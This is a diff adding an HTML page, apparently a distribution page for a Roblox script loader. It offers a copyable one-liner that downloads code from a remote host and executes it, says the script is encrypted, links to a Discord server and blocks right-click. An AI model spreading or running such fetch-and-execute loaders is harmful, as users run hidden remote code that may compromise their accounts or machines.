@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Loadstring</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: #0d1117;
+            color: #c9d1d9;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            user-select: none;
+            -webkit-user-select: none;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 480px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* 標題：📜 Loadstring */
+        .title {
+            font-size: 28px;
+            font-weight: 800;
+            color: #ffffff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 24px;
+            letter-spacing: -0.5px;
+        }
+
+        /* 腳本主卡片容器 */
+        .code-card {
+            width: 100%;
+            background-color: #121824;
+            border: 1px solid #1e2638;
+            border-radius: 12px;
+            padding: 18px 16px 16px 16px;
+            position: relative;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
+        }
+
+        /* 右上角 Copy 按鈕 */
+        .copy-btn {
+            position: absolute;
+            top: 12px;
+            right: 12px;
+            background-color: #263043;
+            color: #ffffff;
+            border: none;
+            border-radius: 6px;
+            padding: 6px 14px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            z-index: 10;
+        }
+
+        .copy-btn:hover {
+            background-color: #323e57;
+        }
+
+        .copy-btn:active {
+            transform: scale(0.95);
+        }
+
+        /* 水平滑動代碼內容區 */
+        .code-scroll-container {
+            width: 100%;
+            overflow-x: auto;
+            white-space: nowrap;
+            padding-right: 70px; /* 避免被 Copy 按鈕遮擋 */
+            margin-top: 4px;
+            font-family: Consolas, "Courier New", Monaco, monospace;
+            font-size: 14px;
+            line-height: 1.6;
+            -webkit-overflow-scrolling: touch; /* iOS 極致滑順滑動 */
+        }
+
+        /* 精緻滾動條 */
+        .code-scroll-container::-webkit-scrollbar {
+            height: 4px;
+        }
+        .code-scroll-container::-webkit-scrollbar-thumb {
+            background: #232c3d;
+            border-radius: 4px;
+        }
+
+        /* 語法高亮 (完全還原截圖顏色) */
+        .kw-blue {
+            color: #58a6ff; /* loadstring */
+        }
+        .kw-cyan {
+            color: #79c0ff; /* game, HttpGet */
+        }
+        .kw-punct {
+            color: #d2a8ff; /* 括弧與符號 */
+        }
+        .kw-str {
+            color: #f0883e; /* 網址橘色高亮 */
+        }
+
+        /* 底部提示文字 */
+        .footer-note {
+            margin-top: 24px;
+            font-size: 13px;
+            color: #8b949e;
+            text-align: center;
+            line-height: 1.6;
+        }
+
+        /* Discord 連結 */
+        .dc-link {
+            display: inline-block;
+            margin-top: 6px;
+            color: #8b949e;
+            text-decoration: none;
+            font-size: 13px;
+            transition: color 0.2s;
+        }
+
+        .dc-link:hover {
+            color: #58a6ff;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- 標題 -->
+        <h1 class="title">
+            <span>📜</span>
+            <span>Loadstring</span>
+        </h1>
+
+        <!-- 代碼卡片 -->
+        <div class="code-card">
+            <button class="copy-btn" id="copyBtn" onclick="copyScript()">Copy</button>
+            <div class="code-scroll-container" id="codeContent">
+                <span class="kw-blue">loadstring</span><span class="kw-punct">(</span><span class="kw-cyan">game</span><span class="kw-punct">:</span><span class="kw-cyan">HttpGet</span><span class="kw-punct">(</span><span class="kw-str">"https://racn-loader.xyz.ci/raw/auth_k9x2p8"</span><span class="kw-punct">))()</span>
+            </div>
+        </div>
+
+        <!-- 底部加密提示與 Discord -->
+        <div class="footer-note">
+            Contents can not be displayed on browser • 此腳本已被加密
+            <br>
+            <a href="https://discord.gg/wdrpVxyjTe" target="_blank" class="dc-link">https://discord.gg/wdrpVxyjTe</a>
+        </div>
+    </div>
+
+    <script>
+        // 要複製的完整腳本字串
+        const rawScript = 'loadstring(game:HttpGet("https://racn-loader.xyz.ci/raw/auth_k9x2p8"))()';
+
+        function copyScript() {
+            navigator.clipboard.writeText(rawScript).then(() => {
+                const btn = document.getElementById('copyBtn');
+                btn.textContent = 'Copied!';
+                btn.style.backgroundColor = '#238636';
+                setTimeout(() => {
+                    btn.textContent = 'Copy';
+                    btn.style.backgroundColor = '#263043';
+                }, 2000);
+            });
+        }
+
+        // 基礎安全防護：停用右鍵防偷翻
+        document.addEventListener('contextmenu', e => e.preventDefault());
+    </script>
+
+    <!--
+    ====================================================================
+    【XXX 核心 LUA 代碼備份區塊】
+    如果有需要隨時更新的 Roblox Lua 腳本主體，可直接放在此處：
+    ====================================================================
+    
+    -- [XXX LUA CODE START]
+    
+    print("Racn Loader Verified & Started")
+    
+    -- [XXX LUA CODE END]
+    ====================================================================
+    -->
+</body>
+</html>
